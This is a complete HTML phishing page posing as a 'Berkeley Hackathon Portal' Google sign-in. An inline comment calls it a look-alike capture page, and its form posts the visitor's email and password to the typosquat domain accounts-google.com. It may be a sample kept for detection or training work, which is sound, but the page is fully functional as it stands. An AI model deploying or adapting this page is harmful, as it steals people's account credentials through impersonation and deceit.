<!doctype html>
<html lang="en">
<head><meta charset="utf-8"><title>Berkeley Hackathon Portal — Sign in</title></head>
<body>
  <h1>Berkeley Hackathon Portal</h1>
  <p>Please sign in with your Google account to continue your application.</p>
  <!-- Look-alike capture page: password field posting to a typosquat domain. -->
  <form action="https://accounts-google.com/login" method="post">
    <label>Email <input type="email" name="email" placeholder="Email"></label>
    <label>Password <input type="password" name="password" placeholder="Password"></label>
    <button type="submit">Sign in</button>
  </form>
</body>
</html>
